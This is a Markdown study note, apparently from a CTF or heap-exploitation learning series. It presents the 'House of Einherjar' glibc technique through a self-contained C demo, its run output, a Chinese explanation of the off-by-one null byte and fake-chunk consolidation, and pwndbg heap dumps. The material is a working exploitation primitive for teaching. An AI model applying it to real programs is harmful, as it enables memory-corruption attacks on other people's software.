# house_of_einherjar

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to House of Einherjar!\n");
	printf("Tested in Ubuntu 16.04 64bit.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	printf("a: %p\n", a);
	
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

	// create a fake chunk
	printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
	printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
	printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
	printf("(although we could do the unsafe unlink technique here in some scenarios)\n");

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
	fake_chunk[2] = (size_t) fake_chunk; // fwd
	fake_chunk[3] = (size_t) fake_chunk; // bck
	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
	fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


	printf("Our fake chunk at %p looks like:\n", fake_chunk);
	printf("prev_size (not used): %#lx\n", fake_chunk[0]);
	printf("size: %#lx\n", fake_chunk[1]);
	printf("fwd: %#lx\n", fake_chunk[2]);
	printf("bck: %#lx\n", fake_chunk[3]);
	printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
	printf("bck_nextsize: %#lx\n", fake_chunk[5]);

	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xf8);
	int real_b_size = malloc_usable_size(b);

	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
	printf("b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	printf("\nb.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x100) | prev_inuse = 0x101\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; 
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("This is easiest if b.size is a multiple of 0x100 so you "
		   "don't change the size of b, only its prev_inuse bit\n");
	printf("If it had been modified, we would need a fake chunk inside "
		   "b where it will try to consolidate the next chunk\n");

	// Write a fake prev_size to the end of a
	printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
		   "it will consolidate with our fake chunk\n", sizeof(size_t));
	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

	//Change the fake chunk's size to reflect b's new prev_size
	printf("\nModify fake chunk's size to reflect b's new prev_size\n");
	fake_chunk[1] = fake_size;

	// free b and it will consolidate with our fake chunk
	printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
	free(b);
	printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

	//if we allocate another chunk before we free b we will need to 
	//do two things: 
	//1) We will need to adjust the size of our fake chunk so that
	//fake_chunk + fake_chunk's size points to an area we control
	//2) we will need to write the size of our fake chunk
	//at the location we control. 
	//After doing these two things, when unlink gets called, our fake chunk will
	//pass the size(P) == prev_size(next_chunk(P)) test. 
	//otherwise we need to make sure that our fake chunk is up against the
	//wilderness

	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
	d = malloc(0x200);
	printf("Next malloc(0x200) is at %p\n", d);
}
```

**result**

```c
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x711010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7ffea8469030 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7ffea8469030
bck: 0x7ffea8469030
fwd_nextsize: 0x7ffea8469030
bck_nextsize: 0x7ffea8469030

We allocate 0xf8 bytes for 'b'.
b: 0x711050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x711040 - 0x7ffea8469030 = 0xffff8001582a8010

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff8001582c8fd1 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7ffea8469040
```

**analysis**

首先申请了0x38size的a（实际chunk大小0x41），又申请了0xf8的b（实际chunk大小0x101），在栈上构造一个fake chunk，其fd，bk都指向自身。

通过a的off-by-one将b的prev_inuse位置0，使b认为其前面有一个free chunk。

之后计算了b与fake chunk的地址偏移差，用chunk b的地址减去fake chunk的地址。因为prev_size是在b之前free chunk的size。

在b的prev_size域和fake chunk的size域填入fake_size，这样b的前一个chunk就是fake chunk，而且是free的。

free(b)后，使用unlink将fake chunk取出，而b与top chunk相邻，这样我们就将top chunk指针指向了fake chunk。即相当于把top chunk进行一次大扩展！

所以，之后malloc的chunk就是从fake chunk+0x10分配的。

这里还绕过了unlink的检查，对于size的检查只要设置好相应的size与prev_size，即可简单的绕过。

双向链表的检查，通过将fake chunk的fd和bk都指向自身，所以

```c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);
```

总是正确的。

**利用条件**

- off-by-one
- 可控地址
- heap地址

**gdb**

off-by-one后堆布局

```c
0x603000	0x0000000000000000	0x0000000000000041	........A.......
0x603010	0x0000000000000000	0x0000000000000000	................
0x603020	0x0000000000000000	0x0000000000000000	................
0x603030	0x0000000000000000	0x0000000000000000	................
0x603040	0xffff8000006053e0	0x0000000000000100	.S`.............
0x603050	0x0000000000000000	0x0000000000000000	................
0x603060	0x0000000000000000	0x0000000000000000	................
0x603070	0x0000000000000000	0x0000000000000000	................
0x603080	0x0000000000000000	0x0000000000000000	................
0x603090	0x0000000000000000	0x0000000000000000	................
0x6030a0	0x0000000000000000	0x0000000000000000	................
0x6030b0	0x0000000000000000	0x0000000000000000	................
0x6030c0	0x0000000000000000	0x0000000000000000	................
0x6030d0	0x0000000000000000	0x0000000000000000	................
0x6030e0	0x0000000000000000	0x0000000000000000	................
0x6030f0	0x0000000000000000	0x0000000000000000	................
0x603100	0x0000000000000000	0x0000000000000000	................
0x603110	0x0000000000000000	0x0000000000000000	................
0x603120	0x0000000000000000	0x0000000000000000	................
0x603130	0x0000000000000000	0x0000000000000000	................
0x603140	0x0000000000000000	0x0000000000020ec1	................	 <-- Top chunk
```

free(b)后

```c
Allocated chunk
Addr: 0x7ffffffde010
Size: 0x00
```

```c
pwndbg> x/16 0x603140
0x603140:	0x00000000	0x00000000	0x00020ec1	0x00000000
0x603150:	0x00000000	0x00000000	0x00000000	0x00000000
0x603160:	0x00000000	0x00000000	0x00000000	0x00000000
0x603170:	0x00000000	0x00000000	0x00000000	0x00000000
```

top chunk原来的size还在。

